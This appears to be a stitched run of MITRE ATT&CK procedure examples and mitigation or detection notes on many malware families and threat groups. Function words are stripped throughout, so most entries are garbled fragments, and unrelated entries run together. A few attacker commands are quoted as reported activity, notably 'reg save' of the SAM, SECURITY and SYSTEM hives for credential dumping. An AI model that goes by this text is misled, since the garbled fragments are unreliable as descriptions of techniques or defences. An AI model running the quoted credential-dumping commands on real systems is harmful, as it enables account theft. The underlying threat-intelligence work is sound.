Ke3chang November 2014) [Bandook](https://attack.mitre.org/software/S0234) PowerShell loaders execution.(Citation: CheckPoint Bandook Nov 2020) [CrackMapExec](https://attack.mitre.org/software/S0488) discover filetypes log files targeted system.(Citation: CME Github September 2018) [GreyEnergy](https://attack.mitre.org/software/S0342) module inject binary remote process.(Citation: ESET GreyEnergy Oct 2018) [POSHSPY](https://attack.mitre.org/software/S0150) encrypts C2 traffic AES RSA.(Citation: FireEye POSHSPY April 2017) [RemoteCMD](https://attack.mitre.org/software/S0166) copies file remote execution.(Citation: Symantec Buckeye) [Kwampirs](https://attack.mitre.org/software/S0236) rundll32.exe Registry establish persistence.(Citation: Symantec Orangeworm April 2018) (Citation: Symantec Orangeworm April 2018) [BoxCaon](https://attack.mitre.org/software/S0651) capability download folders' contents upload Dropbox drive.(Citation: Checkpoint IndigoZebra July 2021) [Threat Group-1314](https://attack.mitre.org/groups/G0028) actors victim's endpoint management platform, Altiris, lateral movement.(Citation: Dell TG-1314) [XTunnel](https://attack.mitre.org/software/S0117) SSL/TLS RC4 encrypt traffic.(Citation: Invincea XTunnel)(Citation: ESET Sednit 2) [Helminth](https://attack.mitre.org/software/S0170) checked local administrators group.(Citation: Unit 42 Playbook Dec 2017) [Cobalt Group](https://attack.mitre.org/groups/G0080) HTTPS C2.(Citation: Talos Cobalt July 2018)(Citation: PTSecurity Cobalt Dec 2016)(Citation: IB Cobalt Aug 2017) SecretsDump [Mimikatz](https://attack.mitre.org/software/S0002) modules [Impacket](https://attack.mitre.org/software/S0357) perform credential dumping account password information.(Citation: Impacket Tools) [UNC2452](https://attack.mitre.org/groups/G0118) routinely removed tools, including custom backdoors, remote access achieved.(Citation: FireEye SUNBURST Backdoor December 2020) Remove vulnerable Policy Preferences.(Citation: MS14-025) [Lazarus Group](https://attack.mitre.org/groups/G0032) DOCX files retrieve malicious document template/DOTM file.(Citation: ClearSky Lazarus Aug 2020)(Citation: McAfee Lazarus Jul 2020) Monitor operating network device image downgrade conjunction with  [Patch Image](https://attack.mitre.org/techniques/T1601/001), verify integrity vendor operating image file. [Patchwork](https://attack.mitre.org/groups/G0040) hides base64-encoded encrypted C2 server locations comments legitimate websites.(Citation: Securelist Dropping Elephant) [Rising Sun](https://attack.mitre.org/software/S0448) send data gathered infected machine POST request C2.(Citation: McAfee Sharpshooter December 2018)	 Monitor files modify add LSASS drivers persistence compromised systems. [PowGoop](https://attack.mitre.org/software/S1046) side-load `Goopdate.dll` `GoogleUpdate.exe`.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022) [EVILNUM](https://attack.mitre.org/software/S0568) download upload files victim's computer.(Citation: ESET EvilNum July 2020)(Citation: Prevailion EvilNum 2020) [Skidmap](https://attack.mitre.org/software/S0468) <code>pm.sh</code> download install main payload.(Citation: Trend Micro Skidmap) [Kimsuky](https://attack.mitre.org/groups/G0094) `ipconfig/all` gather network configuration information.(Citation: Talos Kimsuky Nov 2021) [FoggyWeb](https://attack.mitre.org/software/S0661)'s loader check [FoggyWeb](https://attack.mitre.org/software/S0661) backdoor .pri file compromised FS server.(Citation: MSTIC FoggyWeb September 2021) [Cannon](https://attack.mitre.org/software/S0351) victim drive list folders C:\Program Files.(Citation: Unit42 Cannon Nov 2018) [WannaCry](https://attack.mitre.org/software/S0366) attempt determine local network segment of.(Citation: SecureWorks WannaCry Analysis) [Egregor](https://attack.mitre.org/software/S0554) regsvr32.exe execute malicious DLLs.(Citation: JoeSecurity Egregor 2020) [Zeus Panda](https://attack.mitre.org/software/S0330) C2 communications.(Citation: Talos Zeus Panda Nov 2017) [OilRig](https://attack.mitre.org/groups/G0049) LinkedIn send spearphishing links.(Citation: FireEye APT34 July 2019) [KOCTOPUS](https://attack.mitre.org/software/S0669) disguised legitimate software programs travel airline industries.(Citation: MalwareBytes LazyScripter Feb 2021)  [GoldMax](https://attack.mitre.org/software/S0588) HTTPS requests custom cookies C2.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021) [Tropic Trooper](https://attack.mitre.org/groups/G0081) collected automatically adversary's [USBferry](https://attack.mitre.org/software/S0452) attack.(Citation: TrendMicro Tropic Trooper 2020)	 [Turian](https://attack.mitre.org/software/S0647) insert pseudo-random characters network encryption setup.(Citation: ESET BackdoorDiplomacy Jun 2021) [Turla](https://attack.mitre.org/groups/G0010) custom .NET tool collect documents organization's internal central database.(Citation: ESET ComRAT 2020) [WEBC2](https://attack.mitre.org/software/S0109) interactive command shell.(Citation: Mandiant APT1) Limit communications container service local Unix sockets remote access SSH. Require secure port access communicate APIs TLS disabling unauthenticated access Docker API Kubernetes API Server.(Citation: Docker Daemon Socket Protect)(Citation: Kubernetes API Control Access) [Green Lambert](https://attack.mitre.org/software/S0690) establish persistence compromised host modifying `profile`, `login`, command (rc) files `bash`, `csh`, `tcsh` shells. (Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021)  [BADNEWS](https://attack.mitre.org/software/S0128) capable downloading additional files C2 channels, including version itself.(Citation: Forcepoint Monsoon)(Citation: PaloAlto Patchwork Mar 2018)(Citation: TrendMicro Patchwork Dec 2017) [Okrum](https://attack.mitre.org/software/S0439)'s loader decrypt backdoor code, embedded loader legitimate PNG file. custom XOR cipher RC4 decryption.(Citation: ESET Okrum July 2019) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors discovered removable disks attached system.(Citation: FoxIT Wocao December 2019) Limit access Instance Metadata API host-based firewall iptables.(Citation: RedLock Instance Metadata API 2018) properly configured Application Firewall (WAF) prevent external adversaries exploiting Server-side Request Forgery (SSRF) attacks access Cloud Instance Metadata API. [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors generated vulnerable Enterprise Resource Planning Application Server persistence mechanism.(Citation: Cybereason OperationCuckooBees 2022) [WindTail](https://attack.mitre.org/software/S0466) ability decrypt strings hard-coded AES keys.(Citation: objective-see windtail1 dec 2018) [Pysa](https://attack.mitre.org/software/S0583) perform OS credential dumping [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: CERT-FR PYSA April 2020) [Dark Caracal](https://attack.mitre.org/groups/G0070) spearphished victims Facebook Whatsapp.(Citation: Lookout Dark Caracal Jan 2018) Monitor authentication logs application login failures [Valid Accounts](https://attack.mitre.org/techniques/T1078). event IDs:(Citation: Trimarc Detecting Password Spraying)
Domain Controllers: "Audit Logon" (Success & Failure) event 4625.
Domain Controllers: "Audit Kerberos Authentication Service" (Success & Failure) event 4771.
All systems: "Audit Logon" (Success & Failure) event 4648. [NETEAGLE](https://attack.mitre.org/software/S0034) detect proxy configured infected machine, send beacons UDP/6000. Also, retrieving C2 IP address Port Number, [NETEAGLE](https://attack.mitre.org/software/S0034) initiate TCP connection socket. ensuing connection plaintext C2 channel commands DWORDs.(Citation: FireEye APT30) [PoisonIvy](https://attack.mitre.org/software/S0012) Camellia cipher encrypt communications.(Citation: FireEye Poison Ivy) Monitor suspicious <code>gpresult</code>. Monitor PowerShell functions <code>Get-DomainGPO</code> <code>Get-DomainGPOLocalGroup</code> processes spawning command-line arguments <code>GPOLocalGroup</code>. [OnionDuke](https://attack.mitre.org/software/S0052) HTTPS C2.(Citation: F-Secure Dukes) [Bandook](https://attack.mitre.org/software/S0234) collect drives system.(Citation: CheckPoint Bandook Nov 2020)  [APT41](https://attack.mitre.org/groups/G0096) [certutil](https://attack.mitre.org/software/S0160) download additional files.(Citation: FireEye APT41 March 2020)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: IB APT 41 June 2021) Script blocking extensions prevent execution JavaScript HTA files commonly exploitation process. malicious code served ads, adblockers prevent code executing place. implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. [HOPLIGHT](https://attack.mitre.org/software/S0376) ability connect remote host upload download files.(Citation: US-CERT HOPLIGHT Apr 2019)	 [Transparent Tribe](https://attack.mitre.org/groups/G0134) spearphishing e-mails attachments deliver malicious payloads.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe 2021)(Citation: Unit 42 ProjectM March 2016)	  [APT29](https://attack.mitre.org/groups/G0016) compromised credentials remote access laterally.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: MSTIC NOBELIUM Mar 2021)(Citation: Cybersecurity Advisory SVR TTP 2021) [RDAT](https://attack.mitre.org/software/S0495) issue SOAP requests delete processed C2 emails. [RDAT](https://attack.mitre.org/software/S0495) delete infected system.(Citation: Unit42 RDAT July 2020)	 Monitor newly executed processes leverage Office-based applications persistence startups. Collect process execution including process IDs (PID) parent process IDs (PPID) abnormal chains activity Office processes. Non-standard process execution trees suspicious malicious behavior. winword.exe parent process suspicious processes activity relating adversarial techniques, application maliciously. Monitor newly constructed network connections received untrusted hosts.  [Chaes](https://attack.mitre.org/software/S0631) stored instructions config file Registry.(Citation: Cybereason Chaes Nov 2020)  [ROKRAT](https://attack.mitre.org/software/S0240) legitimate social networking sites cloud platforms (including limited Twitter, Yandex, Dropbox, Mediafire) C2 communications.(Citation: Talos ROKRAT)(Citation: Securelist ScarCruft 2019)(Citation: Volexity InkySquid RokRAT August 2021) removal the <code>com.apple.quarantine</code> flag user operating suspicious action examined further. monitor software update frameworks strip this flag performing updates. [USBferry](https://attack.mitre.org/software/S0452) collect air-gapped host machine.(Citation: TrendMicro Tropic Trooper 2020)	 process monitoring monitor execution arguments InstallUtil.exe. Compare invocations InstallUtil.exe prior history arguments executed binaries determine anomalous adversarial activity [TinyTurla](https://attack.mitre.org/software/S0668) list C2 server IPs register responds.(Citation: Talos TinyTurla September 2021) Enable UpdateFolderPermissions action logon types. mailbox audit log folder permission modification events Unified Audit Log. Create rules alert ModifyFolderPermissions operations Anonymous Default user assigned permissions None.

A larger normal volume emails account phishing emails from real accounts network sign account compromised attempts leverage access modified email permissions occurring. domain administrator accounts day-to-day operations expose potential adversaries unprivileged systems. [LookBack](https://attack.mitre.org/software/S0582) custom binary protocol sockets C2 communications.(Citation: Proofpoint LookBack Malware Aug 2019) [Kinsing](https://attack.mitre.org/software/S0599) executed Ubuntu container deployed Docker daemon API.(Citation: Aqua Kinsing April 2020) [HALFBAKED](https://attack.mitre.org/software/S0151) screenshots victim.(Citation: FireEye FIN7 April 2017) [Denis](https://attack.mitre.org/software/S0354) enumerates collects username victim’s machine.(Citation: Securelist Denis April 2017)(Citation: Cybereason Cobalt Kitty 2017) [Octopus](https://attack.mitre.org/software/S0340) wmic.exe local discovery information.(Citation: Securelist Octopus Oct 2018) Monitor executed commands arguments binaries involved shutting rebooting systems. network devices, monitor executed commands AAA logs, unexpected unauthorized users. [Transparent Tribe](https://attack.mitre.org/groups/G0134) directed users URLs hosting malicious content.(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe 2021) Monitor executed commands arguments 'systemd-run' utility create timers [PlugX](https://attack.mitre.org/software/S0013) configured DNS command control.(Citation: Dell TG-3390) [Bisonal](https://attack.mitre.org/software/S0268) raw sockets network communication.(Citation: Talos Bisonal Mar 2020) Monitor executed commands arguments abuse Outlook's feature persistence compromised system. released PowerShell script safely gather mail forwarding rules custom forms mail environment steps interpret output.(Citation: Detect Outlook Forms) [AppleSeed](https://attack.mitre.org/software/S0622) ability Base64 encode payload custom encrypt API calls.(Citation: Malwarebytes Kimsuky June 2021) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors purchased hosted services C2.(Citation: McAfee Night Dragon) [SysUpdate](https://attack.mitre.org/software/S0663) ability set file attributes hidden.(Citation: Trend Micro Iron Tiger April 2021) Monitor suspicious files .pdf, .docx, .jpg, etc.) viewed isolation steal data exfiltrating protocol existing command control channel. [Bandook](https://attack.mitre.org/software/S0234) lure documents convince user enable macros.(Citation: CheckPoint Bandook Nov 2020)  [Catchamas](https://attack.mitre.org/software/S0261) adds service named NetAdapter apparent attempt masquerade legitimate service.(Citation: Symantec Catchamas April 2018) [APT28](https://attack.mitre.org/groups/G0007) split archived exfiltration files chunks 1MB.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [POWRUNER](https://attack.mitre.org/software/S0184) written PowerShell.(Citation: FireEye APT34 Dec 2017) [QakBot](https://attack.mitre.org/software/S0650) ability TCP send receive C2 packets.(Citation: Kaspersky QakBot September 2021) investigation [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), security researchers identified [Rising Sun](https://attack.mitre.org/software/S0448) 87 organizations globe subsequently discovered variants.(Citation: McAfee Sharpshooter December 2018)(Citation: Bleeping Op Sharpshooter March 2019) Prevent adversary access privileged accounts access replace firmware. [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [Mimikatz](https://attack.mitre.org/software/S0002)'s DCSync dump credentials memory targeted system.(Citation: FoxIT Wocao December 2019)  (Citation: Crowdstrike GTR2020 Mar 2020) [Milan](https://attack.mitre.org/software/S1015) hardcoded domains input domain generation algorithms.(Citation: Accenture Lyceum Targets November 2021) [Misdat](https://attack.mitre.org/software/S0083) capable providing functionality attacker execute commands.(Citation: Cylance Dust Storm) [TajMahal](https://attack.mitre.org/software/S0467) ability inject <code>LoadLibrary</code> template DLL running processes.(Citation: Kaspersky TajMahal April 2019) [Gazer](https://attack.mitre.org/software/S0168) establish persistence screensaver configuring execute malware.(Citation: ESET Gazer Aug 2017) [Diavol](https://attack.mitre.org/software/S0659) API calls `GetLogicalDriveStrings`, `SleepEx`, `SystemParametersInfoAPI`, `CryptEncrypt`, execute attack.(Citation: Fortinet Diavol July 2021) Limit privileges user accounts authorized administrators interact service service configurations. [XCSSET](https://attack.mitre.org/software/S0658) loads level launchdaemon <code>launchctl load -w</code> command <code>/System/Librarby/LaunchDaemons/ssh.plist</code>.(Citation: trendmicro xcsset xcode project 2020) [Agent Tesla](https://attack.mitre.org/software/S0331) collect system's capability collect processor, memory, OS, video card system.(Citation: Fortinet Agent Tesla April 2018)(Citation: Fortinet Agent Tesla June 2017)(Citation: Malwarebytes Agent Tesla April 2020) [ComRAT](https://attack.mitre.org/software/S0126) check default browser querying <code>HKCR\http\shell\open\command</code>.(Citation: ESET ComRAT 2020) [Remexi](https://attack.mitre.org/software/S0375) encrypts adds gathered browser data files upload C2.(Citation: Securelist Remexi Jan 2019) Restrict permissions access FS server originate privileged access workstations.(Citation: FireEye ADFS) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) encrypt payload.(Citation: SentinelOne Aoqin Dragon June 2022) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors [PsExec](https://attack.mitre.org/software/S0029) remotely execute droppers.(Citation: McAfee Night Dragon) [GravityRAT](https://attack.mitre.org/software/S0237) executes commands remotely infected host.(Citation: Talos GravityRAT) (Citation: TrendMicro Tropic Trooper Mar 2018) [SpicyOmelette](https://attack.mitre.org/software/S0646) executed malicious links spearphishing emails.(Citation: Secureworks GOLD KINGSWOOD September 2018) [APT29](https://attack.mitre.org/groups/G0016) developed malware variants written Python.(Citation: ESET Dukes October 2019) [HermeticWizard](https://attack.mitre.org/software/S0698) execute files remote machines DCOM.(Citation: ESET Hermetic Wizard March 2022) Monitor processes inject malicious code processes thread local storage (TLS) callbacks evade process-based defenses elevate privileges. [DarkComet](https://attack.mitre.org/software/S0334) C2 communications.(Citation: Malwarebytes DarkComet March 2018) [ccf32](https://attack.mitre.org/software/S1043) daily basis scheduled task.(Citation: Bitdefender FunnyDream Campaign November 2020) Monitor suspicious email activity, numerous accounts receiving messages single unusual/unknown sender. Filtering based DKIM+SPF header analysis detect email sender spoofed.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) [HOPLIGHT](https://attack.mitre.org/software/S0376) WMI recompile Managed Object Format (MOF) files WMI repository.(Citation: US-CERT HOPLIGHT Apr 2019)	 [Revenge RAT](https://attack.mitre.org/software/S0379) [Forfiles](https://attack.mitre.org/software/S0193) utility execute commands system.(Citation: Cofense RevengeRAT Feb 2019) Toolkits PowerSploit framework PowerUp modules explore systems permission weaknesses scheduled tasks escalate privileges. (Citation: Powersploit) loading keyword phone data files, [MESSAGETAP](https://attack.mitre.org/software/S0443) monitoring network connections victim server. (Citation: FireEye MESSAGETAP October 2019) [KGH_SPY](https://attack.mitre.org/software/S0526) enumerate files directories compromised host.(Citation: Cybereason Kimsuky November 2020) (Citation: FireEye APT38 Oct 2018) [Conficker](https://attack.mitre.org/software/S0608) exploited MS08-067 Windows vulnerability remote code execution crafted RPC request.(Citation: SANS Conficker) [SYSCON](https://attack.mitre.org/software/S0464) ability [Tasklist](https://attack.mitre.org/software/S0057) list running processes.(Citation: Unit 42 CARROTBAT January 2020) [Sidewinder](https://attack.mitre.org/groups/G0121) tools automatically collect network configuration information.(Citation: ATT Sidewinder January 2021) Monitor access windows registry attempt gather language victim infer geographical location host. [WastedLocker](https://attack.mitre.org/software/S0612) enumerate files directories prior encryption.(Citation: NCC WastedLocker June 2020) Monitor unexpected browser bookmarks viewed isolation, showcases chain behavior lead activities, Collection Exfiltration, based obtained. default, administrators allowed connect remotely WMI; restrict users allowed connect, disallow users connecting remotely WMI. [Leviathan](https://attack.mitre.org/groups/G0065) [BITSAdmin](https://attack.mitre.org/software/S0190) download additional tools.(Citation: FireEye Periscope March 2018) [Octopus](https://attack.mitre.org/software/S0340) POST requests C2 communications.(Citation: Securelist Octopus Oct 2018)(Citation: ESET Nomadic Octopus 2018) [Saint Bot](https://attack.mitre.org/software/S1018) loader API calls spawn `MSBuild.exe` suspended injecting decrypted [Saint Bot](https://attack.mitre.org/software/S1018) binary it.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) (Citation: Symantec Cicada November 2020) [SHARPSTATS](https://attack.mitre.org/software/S0450) base64 encoding XOR obfuscate PowerShell scripts.(Citation: TrendMicro POWERSTATS V3 June 2019) services aid tracking capabilities, certificates, sites Internet. pivot pieces uncover adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Defense Evasion Command Control. [SUNBURST](https://attack.mitre.org/software/S0559) VBScripts initiate execution payloads.(Citation: Deep Dive Solorigate January 2021) [GeminiDuke](https://attack.mitre.org/software/S0049) HTTPS command control.(Citation: F-Secure Dukes) [WhisperGate](https://attack.mitre.org/software/S0689) ability enumerate fixed logical drives targeted system.(Citation: Cisco Ukraine Wipers January 2022) [MacMa](https://attack.mitre.org/software/S1016) Core Graphics Event Taps intercept user keystrokes input field saves files. input fields include Spotlight, Finder, Safari, Mail, Messages, apps fields passwords.(Citation: Objective-See MacMa Nov 2021)(Citation: SentinelOne MacMa Nov 2021) [Lizar](https://attack.mitre.org/software/S0681) search processes anti-virus product list.(Citation: BiZone Lizar 2021)  Monitor executed commands arguments install modify login hooks. Monitor executed commands arguments RC scripts unusual unknown applications behavior [Molerats](https://attack.mitre.org/groups/G0021) implants, including built VBScript, target machines.(Citation: Kaspersky MoleRATs April 2019)(Citation: Unit42 Molerat Mar 2020) [Nomadic Octopus](https://attack.mitre.org/groups/G0133) malicious macros download additional files victim's machine.(Citation: ESET Nomadic Octopus 2018)  [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), first-stage downloader installed [Rising Sun](https://attack.mitre.org/software/S0448) `%Startup%\mssync.exe` compromised host.(Citation: McAfee Sharpshooter December 2018)  Mshta.exe environment functionality tied versions Internet Explorer reached life. Monitor anomalous Kerberos activity, malformed blank fields Windows logon/logoff events (Event 4624, 4672, 4634), RC4 encryption ticket granting tickets (TGTs), ticket granting service (TGS) requests preceding TGT requests.(Citation: ADSecurity Detecting Forged Tickets)(Citation: Stealthbits Detect PtT 2019)(Citation: CERT-EU Golden Ticket Protection)Monitor lifetime TGT tickets values default domain duration.(Citation: Kerberos Golden Ticket) Monitor indications [Pass Ticket](https://attack.mitre.org/techniques/T1550/003) laterally. [KONNI](https://attack.mitre.org/software/S0356) Rundll32 execute loader privilege escalation purposes.(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021) Determine social media sites, personal webmail services, service spearphishing business operations blocking access activity monitored poses risk. [Bumblebee](https://attack.mitre.org/software/S1039) encrypt C2 requests responses RC4(Citation: Proofpoint Bumblebee April 2022) [Magic Hound](https://attack.mitre.org/groups/G0059) removed mailbox export requests compromised Exchange servers.(Citation: DFIR Report APT35 ProxyShell March 2022) [Metamorfo](https://attack.mitre.org/software/S0455) collect screenshots victim’s machine.(Citation: FireEye Metamorfo Apr 2018)(Citation: ESET Casbaneiro Oct 2019)  analyzing malware features adversary developers, compiler used, debugging artifacts, code similarities. Malware repositories identify additional samples adversary identify development patterns time. [QakBot](https://attack.mitre.org/software/S0650) spread emails malicious links.(Citation: Trend Micro Qakbot 2020)(Citation: Kroll Qakbot June 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: ATT QakBot April 2021)(Citation: Kaspersky QakBot September 2021)(Citation: IB Ransomware September 2020)
 [Ursnif](https://attack.mitre.org/software/S0386) droppers VBA macros download execute malware's executable payload.(Citation: Bromium Ursnif Mar 2017) [njRAT](https://attack.mitre.org/software/S0385) receive stolen infected machine.(Citation: Trend Micro njRAT 2018)	 Monitor attempt user gain access network computing resource, providing credentials [Bazar](https://attack.mitre.org/software/S0534) identify username infected user.(Citation: NCC Team9 June 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) malware PowerShell command check victim architecture determine x64 machine. malware OS version, UUID, computer/host send C2 server.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: DFIR Report APT35 ProxyShell March 2022) Monitoring OS API callbacks execution detect behavior requires specialized security tooling. [C0015](https://attack.mitre.org/campaigns/C0015), threat actors `cmd.exe` execute commands malicious binaries.(Citation: DFIR Conti Bazar Nov 2021) [Chimera](https://attack.mitre.org/groups/G0114) custom DLLs continuous retrieval data memory.(Citation: NCC Chimera January 2021) Proactively reset accounts breached credentials immediately, detecting bruteforce attempts. Monitor executed commands arguments actions utilized unlink, rename, delete files. (Citation: NCC Chimera January 2021) Monitor processes inject portable executables (PE) processes evade process-based defenses elevate privileges. [Magic Hound](https://attack.mitre.org/groups/G0059) collected .PST archives.(Citation: FireEye APT35 2018) [SOUNDBITE](https://attack.mitre.org/software/S0157) capable enumerating application windows.(Citation: FireEye APT32 2017) [GreyEnergy](https://attack.mitre.org/software/S0342) encrypts communications AES256.(Citation: ESET GreyEnergy Oct 2018) [XCSSET](https://attack.mitre.org/software/S0658) searches firewall configuration files located <code>/Library/Preferences/</code> <code>csrutil status</code> determine Integrity Protection enabled.(Citation: trendmicro xcsset xcode project 2020) Monitor newly constructed user accounts attempt hide artifacts behaviors evade detection. Limit credential overlap accounts systems training users administrators password multiple accounts. [GuLoader](https://attack.mitre.org/software/S0561) retrieve additional binaries.(Citation: Unit 42 NETWIRE April 2020)(Citation: Medium Eli Salem GuLoader April 2021) [Stuxnet](https://attack.mitre.org/software/S0603) enumerates user accounts local host.(Citation: Symantec W.32 Stuxnet Dossier) Monitor newly constructed logon behavior “pass ticket” stolen Kerberos tickets laterally environment, bypassing normal access controls. [SpicyOmelette](https://attack.mitre.org/software/S0646) identify payment systems, payment gateways, ATM systems compromised environments.(Citation: Secureworks GOLD KINGSWOOD September 2018) auditing tools capable detecting DLL search hijacking opportunities systems enterprise correct them. Toolkits PowerSploit framework PowerUp modules explore systems DLL hijacking weaknesses.(Citation: Powersploit)

Use program sxstrace.exe included Windows manual inspection check manifest files side-by-side software.(Citation: Sxstrace) Monitor Registry <code>ServiceDll</code> subkey values <code>HKLM\System\CurrentControlSet\services\TermService\Parameters\</code>. [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) downloaded additional files tools compromised host.(Citation: ESET BackdoorDiplomacy Jun 2021) (Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) [Darkhotel](https://attack.mitre.org/groups/G0012) code-signing certificates malware forged weak stolen. [Darkhotel](https://attack.mitre.org/groups/G0012) stolen certificates signed backdoors downloaders them.(Citation: Kaspersky Darkhotel)(Citation: Securelist Darkhotel Aug 2015) Ensuring <code>tty_tickets</code> setting enabled prevent leakage tty sessions. [TEARDROP](https://attack.mitre.org/software/S0560) files names resembled legitimate Window file directory names.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Deep Dive Solorigate January 2021) [WINDSHIELD](https://attack.mitre.org/software/S0155) capable file deletion file interaction.(Citation: FireEye APT32 2017) [FELIXROOT](https://attack.mitre.org/software/S0267) Rundll32 executing dropper program.(Citation: FireEye FELIXROOT July 2018)(Citation: ESET GreyEnergy Oct 2018) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors leveraged custom tool dump OS credentials commands: `reg save HKLM\\SYSTEM system.hiv`, `reg save HKLM\\SAM sam.hiv`, `reg save HKLM\\SECURITY security.hiv`, dump SAM, SECURITY hives.(Citation: Cybereason OperationCuckooBees 2022) Monitor newly constructed processes command-lines execute logon scripts [SUNBURST](https://attack.mitre.org/software/S0559) DNS C2 traffic designed mimic normal SolarWinds API communications.(Citation: FireEye SUNBURST Backdoor December 2020) [InvisiMole](https://attack.mitre.org/software/S0260) decrypt, unpack load DLL resources, blobs encrypted Data Protection API, two-key triple DES, variations XOR cipher.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) [Chaes](https://attack.mitre.org/software/S0631) C2 communications.(Citation: Cybereason Chaes Nov 2020) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) collects running processes.(Citation: Symantec Dragonfly) Windows Server 2016, enable Windows Defender Credential Guard (Citation: Enable Cred Guard April 2017) lsass.exe isolated virtualized environment device drivers. (Citation: Credential Guard April 2017) [REvil](https://attack.mitre.org/software/S0496) check language <code>GetUserDefaultUILanguage</code> <code>GetSystemDefaultUILanguage</code>. language list, process terminates.(Citation: Kaspersky Sodin July 2019)
 [BoxCaon](https://attack.mitre.org/software/S0651) "StackStrings" obfuscation technique hide malicious functionalities.(Citation: Checkpoint IndigoZebra July 2021) removing local Administrators list allowed log RDP. [OilRig](https://attack.mitre.org/groups/G0049) Plink utility tools create tunnels C2 servers.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: FireEye APT34 July 2019) (Citation: FireEye SUNBURST Backdoor December 2020) Limit privileges user accounts remediate Privilege Escalation vectors authorized users create scheduled jobs. Monitor interactions images containers users identify anomalously. Monitor network traffic content evidence data exfiltration, gratuitous anomalous internal traffic collected data. correlation process monitoring command lines collection exfiltration. [Turian](https://attack.mitre.org/software/S0647) ability C2.(Citation: ESET BackdoorDiplomacy Jun 2021) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors enabled HTTPS listeners.(Citation: Cybereason OperationCuckooBees 2022) [GoldenSpy](https://attack.mitre.org/software/S0493) constantly attempts download execute files remote C2, including [GoldenSpy](https://attack.mitre.org/software/S0493) system.(Citation: Trustwave GoldenSpy June 2020)	 [Kimsuky](https://attack.mitre.org/groups/G0094) browser extensions including Google Chrome steal passwords cookies browsers. [Kimsuky](https://attack.mitre.org/groups/G0094) Nirsoft's WebBrowserPassView tool dump passwords victims.(Citation: Zdnet Kimsuky Dec 2018)(Citation: CISA AA20-301A Kimsuky)(Citation: Netscout Stolen Pencil Dec 2018)(Citation: Talos Kimsuky Nov 2021) [Mustang Panda](https://attack.mitre.org/groups/G0129) vssadmin create volume shadow retrieve NTDS.dit file. [Mustang Panda](https://attack.mitre.org/groups/G0129) <code>reg save</code> file Registry location extract NTDS.dit file.(Citation: Secureworks BRONZE PRESIDENT December 2019) [HiddenWasp](https://attack.mitre.org/software/S0394) cipher implement decoding function.(Citation: Intezer HiddenWasp Map 2019) [FIN8](https://attack.mitre.org/groups/G0061) RAR compress collected data exfiltration.(Citation: FireEye Enemy FIN8 Aug 2016) (Citation: FireEye FIN7 March 2017) (Citation: FireEye APT41 March 2020)(Citation: IB APT 41 June 2021) [Green Lambert](https://attack.mitre.org/software/S0690) create [Launch Agent](https://attack.mitre.org/techniques/T1543/001) `RunAtLoad` key-value pair set <code>true</code>, ensuring `com.apple.GrowlHelper.plist` file runs time user logs in.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021) [Cobalt Strike](https://attack.mitre.org/software/S0154) custom command control protocol encapsulated HTTP, HTTPS, DNS. addition, conducts peer-to-peer communication Windows named pipes encapsulated SMB protocol. protocols standard assigned ports.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020) [Clambling](https://attack.mitre.org/software/S0660) determine current time.(Citation: Trend Micro DRBControl February 2020) (Citation: Mandiant APT1) [MuddyWater](https://attack.mitre.org/groups/G0069) distributed URLs phishing e-mails link lure documents.(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021) strings [ADVSTORESHELL](https://attack.mitre.org/software/S0045) encrypted XOR-based algorithm; strings encrypted 3DES reversed. API function names reversed, avoid detection memory.(Citation: Kaspersky Sofacy)(Citation: Bitdefender APT28 Dec 2015) [APT29](https://attack.mitre.org/groups/G0016) removed evidence email export requests <code>Remove-MailboxExportRequest</code>.(Citation: Volexity SolarWinds) [ZeroT](https://attack.mitre.org/software/S0230) DLL files packed UPX.(Citation: Proofpoint ZeroT Feb 2017) [NativeZone](https://attack.mitre.org/software/S0637) check presence KM.EkeyAlmaz1C.dll halt execution directory rest malware's components.(Citation: MSTIC Nobelium Toolset 2021)(Citation: SentinelOne NobleBaron June 2021) [Naid](https://attack.mitre.org/software/S0205) creates service establish.(Citation: Symantec Naid June 2012) [PowerSploit](https://attack.mitre.org/software/S0194)'s 